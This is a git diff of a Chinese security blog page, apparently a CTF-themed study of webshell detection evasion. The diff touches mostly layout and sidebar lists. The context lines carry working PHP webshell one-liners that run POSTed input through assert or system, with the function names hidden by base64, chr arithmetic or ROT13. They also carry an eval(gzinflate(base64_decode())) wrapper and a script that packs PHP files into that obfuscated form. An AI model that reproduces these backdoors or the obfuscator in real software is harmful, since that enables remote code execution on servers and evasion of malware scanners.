@@ -107,7 +107,6 @@
 </div>
       <p><strong>Study and Reaserch of Webshell-Bypass</strong></p>
 <span id="more"></span>
-
 <p><strong>感谢<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/">曾哥</a>提供的参考资料</strong></p>
 <h1 id="Webshell查杀思路"><a href="#Webshell查杀思路" class="headerlink" title="Webshell查杀思路"></a>Webshell查杀思路</h1><ul>
 <li>分析统计内容</li>
@@ -121,55 +120,23 @@
 <h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>在免杀中system()函数用的比较多</p>
 <h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p><strong>base64编码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;YX____Nz__ZX__J0&quot;</span>);  <span class="comment">//解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[aabyss]);                      <span class="comment">//assert($_POST[aabyss]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><strong>ascii编码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]); <span class="comment">//assert($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><strong>ROT13编码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;flfgrz&#x27;</span>);<span class="comment">//解码后为system</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><strong>Gzip压缩加密</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpinfo()加密后的例子</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;40pNzshXKMgoyMxLy9fQtFawtwMA&#x27;</span>))); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>解密方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//放入已经加密的PHP内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval(gzinflate(base64_decode(&#x27;40pNzshXKMgoyMxLy9fQtFawtwMA&#x27;)));&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodephp</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$max_level</span> = <span class="number">300</span>; <span class="comment">//最大层数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$max_level</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="comment">//        使用了 ob_start() 和 ob_get_clean() 来捕获输出</span></span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;echo&#x27;</span>, <span class="variable">$a</span>));</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"><span class="comment">//        如果 $a 不再包含 &quot;eval(gzinflate(base64_decode&quot;，则函数返回解码的代码。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>, <span class="string">&#x27;eval(gzinflate(base64_decode&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用 htmlspecialchars() 函数是为了安全地在网页上显示解码后的代码，而不是执行它</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">decodephp</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>加密方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//encipher.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode_file_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&#x27;.&#x27;</span>),<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;php&#x27;</span>==<span class="variable">$type</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">is_writable</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果是PHP文件 并且可写 则进行压缩编码</span></span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="comment">// 判断文件是否已经被编码处理</span></span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&#x27;/*Protected by AabyssZG*/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">false</span> === <span class="variable">$pos</span> || <span class="variable">$pos</span>&gt;<span class="number">100</span>) &#123;</span><br><span class="line">            <span class="comment">// 去除PHP文件注释和空白，减少文件大小</span></span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="comment">// 去除PHP头部和尾部标识</span></span><br><span class="line">            <span class="variable">$headerPos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&#x27;&lt;?php&#x27;</span>);</span><br><span class="line">            <span class="variable">$footerPos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$contents</span>,<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="variable">$headerPos</span>+<span class="number">5</span>,<span class="variable">$footerPos</span>-<span class="variable">$headerPos</span>);</span><br><span class="line">            <span class="variable">$encode</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">gzdeflate</span>(<span class="variable">$contents</span>));</span><br><span class="line">            <span class="comment">// 开始编码</span></span><br><span class="line">            <span class="variable">$encode</span> = <span class="string">&#x27;&lt;?php&#x27;</span>.<span class="string">&quot; /*Protected by AabyssZG*/\neval(gzinflate(base64_decode(&#x27;&quot;</span>.<span class="variable">$encode</span>.<span class="string">&quot;&#x27;))); \n?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$encode</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">//这里填入需要加密的原始PHP文件名</span></span><br><span class="line"><span class="title function_ invoke__">encode_file_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="字符串混淆处理绕过"><a href="#字符串混淆处理绕过" class="headerlink" title="字符串混淆处理绕过"></a>字符串混淆处理绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/09/11/Webshell%20Bypass/" data-id="cltux1tv5004nos3zhr3d752t" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/09/11/Webshell%20Bypass/" data-id="cltv84kc90058343z2y1v5kqr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -227,7 +194,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -238,6 +205,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2024/03/17/CTF%E2%80%94%E2%80%94Crypto/">CTF——Crypto</a>
+          </li>
         
           <li>
             <a href="/2024/03/17/2024-VCTF-Misc-Writeup/">2024-VCTF-Misc-Writeup</a>
@@ -253,10 +224,6 @@
         
           <li>
             <a href="/2024/02/17/%E4%B8%80%E6%96%87%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%E9%85%8D%E9%95%9C%E8%A1%8C%E4%B8%9A/">一文带你深入了解配镜行业</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/10/CTF%E2%80%94%E2%80%94Misc%20Guide/">CTF——Misc Guide</a>
           </li>
         
       </ul>
@@ -317,5 +284,20 @@
 
 <!-- Toc -->
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
